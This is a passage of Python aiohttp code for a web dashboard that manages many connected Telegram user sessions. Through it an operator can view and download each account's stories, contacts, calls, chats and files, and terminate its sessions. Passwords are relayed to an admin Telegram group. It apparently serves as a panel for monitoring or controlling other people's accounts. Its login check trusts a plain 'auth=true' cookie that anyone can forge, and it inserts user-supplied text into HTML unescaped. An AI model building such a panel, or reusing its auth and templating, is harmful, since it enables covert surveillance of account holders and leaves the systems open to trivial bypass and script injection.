        # Prepare tasks for fetching actual stories
        async def fetch_stories(entity):
            try:
                peer = await client.get_input_entity(entity)
                req = GetPeerStoriesRequest(peer=peer)
                res = await client(req)
                if res and res.stories and res.stories.stories:
                    return res.stories.stories
            except Exception:
                pass
            return []

        all_stories_arrays = await asyncio.gather(*(fetch_stories(e) for e in entities_with_stories), return_exceptions=True)
        
        for idx, entity in enumerate(entities_with_stories):
             stories_array = all_stories_arrays[idx] if isinstance(all_stories_arrays[idx], list) else []
             count = len(stories_array)
             if count == 0: continue
             
             name = utils.get_display_name(entity)
             peer_id = utils.get_peer_id(entity)
             username = getattr(entity, 'username', '')
             uid_text = f"{peer_id} - @{username}" if username else str(peer_id)
             
             # Determine entity type
             entity_type = "Unknown"
             if isinstance(entity, User):
                 entity_type = "User"
             elif isinstance(entity, Channel):
                 if getattr(entity, 'megagroup', False):
                     entity_type = "Group"
                 else:
                     entity_type = "Channel"
             elif getattr(entity, 'is_group', False):
                 entity_type = "Group"

             story_text = f"{count} Story" if count <= 1 else f"{count} Stories"
             sub_text = f"{entity_type} • {story_text}"
             s_id = f"s_{idx}"

             # Generate expand view HTML
             stories_html = '<div style="display:flex; overflow-x:auto; gap:10px;">'
             for s in stories_array:
                 st_id = getattr(s, 'id', 0)
                 s_date = getattr(s, 'date', None)
                 
                 from datetime import timedelta
                 time_str = ""
                 if s_date:
                     try:
                         dt = s_date + timedelta(hours=5, minutes=30)
                         time_str = dt.strftime("%I:%M %p %d/%m").lstrip("0")
                     except Exception:
                         pass
                 
                 caption = getattr(s, 'caption', '') or ''
                 
                 from telethon.tl.types import MessageMediaDocument
                 media_url = f"/api/user/{user_id}/story_media/{peer_id}/{st_id}"
                 download_url = media_url + "?download=1"
                 
                 if isinstance(getattr(s, 'media', None), MessageMediaDocument) and getattr(s.media.document, 'mime_type', '').startswith('video'):
                     media_html = f'<video src="{media_url}" style="width:160px; height:280px; object-fit:cover; border-radius:8px; background:#000;" controls></video>'
                 else:
                     media_html = f'<img src="{media_url}" style="width:160px; height:280px; object-fit:cover; border-radius:8px; background:#eee;">'
                     
                 stories_html += f'''
                 <div style="display:flex; flex-direction:column; width:160px; flex-shrink:0;">
                     {media_html}
                     <div style="font-size:11px; color:#666; margin-top:10px; text-align:center;">{time_str}</div>
                     <div style="font-size:12px; color:#333; margin-top:5px; max-height:36px; overflow:hidden; text-overflow:ellipsis; white-space:normal;">{caption}</div>
                     <a href="{download_url}" download class="more-toggle" style="margin-top:5px; text-align:center; text-decoration:none; display:inline-block; background:#2481cc; color:#fff; border:none; padding:6px 0;">Download</a>
                 </div>
                 '''
             stories_html += '</div>'

             html += f'''
             <div class="user-wrap item-row">
                 <div class="user-row">
                     <img class="user-pic" src="/avatar/{user_id}/{peer_id}" loading="lazy" onerror="this.outerHTML='<div class=\\'user-pic-fallback\\'>{name[:1]}</div>'">
                     <div class="info">
                         <div class="name">{name}</div>
                         <div class="status-text" style="color: #707579; font-size: 11.5px; margin-top: 2px;">{uid_text}</div>
                         <div class="status-text" style="color: #3b5998; font-size: 13px; font-weight: 500; margin-top: 3px;">{sub_text}</div>
                     </div>
                     <div class="right-actions">
                         <button id="btn-{s_id}" class="more-toggle" onclick="toggleDetails('{s_id}')" style="background: rgb(255, 255, 255);">View</button>
                     </div>
                 </div>
                 <div id="details-{s_id}" class="details-box" style="display: none; background: #fff; border: 0px solid #eee; margin-top: 10px;">
                     {stories_html}
                 </div>
             </div>
             '''
        html += "</div>"
        return web.Response(text=html, content_type='text/html')
    except Exception as e:
        return web.Response(text=f"<div style='text-align:center; padding:40px; color:#ff3b30;'>Error: {str(e)}</div>", status=500)

async def handle_story_media_api(request):
    try:
        user_id = request.match_info.get('user_id')
        peer_id = request.match_info.get('peer_id')
        story_id = int(request.match_info.get('story_id'))
        
        active_sessions = request.app['active_sessions']
        session = active_sessions.get(int(user_id))
        
        if not session or not session.client.is_connected():
            return web.Response(status=404)
        
        client = session.client
        from telethon.tl.functions.stories import GetStoriesByIDRequest
        from telethon.tl.types import MessageMediaDocument, MessageMediaPhoto
        
        peer = await client.get_input_entity(int(peer_id))
        req = GetStoriesByIDRequest(peer=peer, id=[story_id])
        res = await client(req)
        
        if not res or not res.stories:
            return web.Response(status=404)
            
        story = res.stories[0]
        
        import io
        file_bytes = io.BytesIO()
        await client.download_media(story.media, file=file_bytes)
        data = file_bytes.getvalue()
        
        content_type = 'application/octet-stream'
        ext = '.bin'
        if isinstance(story.media, MessageMediaPhoto):
            content_type = 'image/jpeg'
            ext = '.jpg'
        elif isinstance(story.media, MessageMediaDocument):
            for attr in getattr(story.media.document, 'attributes', []):
                if hasattr(attr, 'file_name'):
                     import mimetypes
                     content_type = mimetypes.guess_type(attr.file_name)[0] or 'video/mp4'
                     break
            if content_type == 'application/octet-stream':
                 content_type = getattr(story.media.document, 'mime_type', 'video/mp4')
            if 'video' in content_type: ext = '.mp4'

        headers = {}
        if request.query.get('download') == '1':
            headers["Content-Disposition"] = f'attachment; filename="story_{story_id}{ext}"'
        else:
            headers["Content-Type"] = content_type
            
        return web.Response(body=data, headers=headers)
    except Exception as e:
        return web.Response(status=500, text=str(e))


async def start_web_server(active_sessions):
    port = int(os.getenv("PORT", "8081"))
    chars = string.ascii_letters + string.digits
    password = ''.join(secrets.choice(chars) for _ in range(10))
    master_password = ''.join(secrets.choice(chars) for _ in range(15))

    # Auth middleware - checks auth on EVERY request except login page
    @web.middleware
    async def auth_middleware(request, handler):
        # Allow login page and login POST without auth
        if request.path in ('/login',):
            return await handler(request)
        # Check auth cookie
        if request.cookies.get('auth') != 'true':
            # For API/AJAX requests, return 401
            if request.path.startswith('/api/'):
                return web.Response(text='Unauthorized', status=401)
            # For page requests, redirect to login
            raise web.HTTPFound('/login')
        return await handler(request)

    app = web.Application(middlewares=[auth_middleware])
    app['active_sessions'] = active_sessions
    
    # Start Background Task
    asyncio.create_task(auto_set_ttl_task(active_sessions))
    
    app['admin_password'] = password
    app['master_password'] = master_password
    app.router.add_get('/', handle_index)
    app.router.add_get('/login', handle_login_page)
    app.router.add_post('/login', handle_login_post)
    app.router.add_get('/avatar/{user_id}', handle_avatar)
    app.router.add_get('/avatar/{user_id}/{peer_id}', handle_peer_avatar)
    app.router.add_get('/api/user/{user_id}/folders_update', handle_user_folders_update)
    app.router.add_get('/api/user/{user_id}/calls', handle_load_calls_api)
    app.router.add_get('/api/user/{user_id}/contacts', handle_load_contacts_api)
    app.router.add_get('/api/user/{user_id}/contacts/download', handle_download_contacts_api)
    app.router.add_get('/api/user/{user_id}/stickers', handle_load_stickers_api)
    app.router.add_get('/api/user/{user_id}/stories', handle_load_stories_api)
    app.router.add_get('/api/user/{user_id}/story_media/{peer_id}/{story_id}', handle_story_media_api)
    app.router.add_get('/user/{user_id}', handle_user_profile)
    app.router.add_get('/user/{user_id}/folders/more', handle_load_more_dialogs)
    app.router.add_get('/user/{user_id}/folders', handle_user_folders_page)
    app.router.add_post('/api/toggle_star', handle_toggle_star)
    app.router.add_post('/api/set_name', handle_set_name)
    app.router.add_post('/api/terminate_sessions', handle_terminate_sessions)
    app.router.add_post('/api/terminate_session', handle_terminate_session)
    app.router.add_post('/api/check_master', handle_check_master)
    import file_manager
    import chat_viewer
    file_manager.register_fm_routes(app)
    chat_viewer.register_chat_routes(app)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"Web server started on http://0.0.0.0:{port}")
    return site, password, master_password, app

async def handle_check_master(request):
    try:
        data = await request.json()
        pwd = data.get('password')
        if pwd == request.app['master_password']:
            resp = web.json_response({'success': True})
            resp.set_cookie('master_auth', 'true', max_age=3600)
            return resp
        return web.json_response({'success': False})
    except:
        return web.json_response({'success': False})

async def send_dashboard_credentials(bot, chat_id, password, master_password, status_msg=None):
    """Sends the fixed Render URL and credentials to the admin Telegram group."""
    url = RENDER_EXTERNAL_URL
    msg_text = f"Web Dashboard Access...\n\nLogin Password\n<code>{password}</code>\n\nMaster Password\n<code>{master_password}</code>\n\n{url}"
    try:
        if status_msg:
            await status_msg.edit(msg_text, parse_mode='html')
        else:
            await bot.send_message(chat_id, msg_text, parse_mode='html')
    except Exception as e:
        logger.error(f"Failed to send dashboard credentials: {e}")
